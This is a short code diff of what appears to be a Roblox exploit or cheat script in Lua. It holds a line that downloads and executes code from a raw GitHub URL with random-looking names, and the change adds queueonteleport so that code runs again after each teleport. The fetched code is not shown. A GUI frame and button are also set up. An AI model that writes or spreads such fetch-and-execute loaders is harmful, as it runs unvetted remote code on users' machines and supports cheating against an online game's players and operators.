@@ -5,6 +5,8 @@ local telscrt = [[
     loadstring(game:HttpGet("https://raw.githubusercontent.com/uwubakadontkillme/dkdafafasfasdadamafaka/main/fdhadfiaodfgdfgdfgd.lua", true))()
 ]]
 
+queueonteleport(telscrt)
+
 local ScreenGui = Instance.new("ScreenGui")
 local Gui = Instance.new("Frame")
 local World = Instance.new("TextButton")
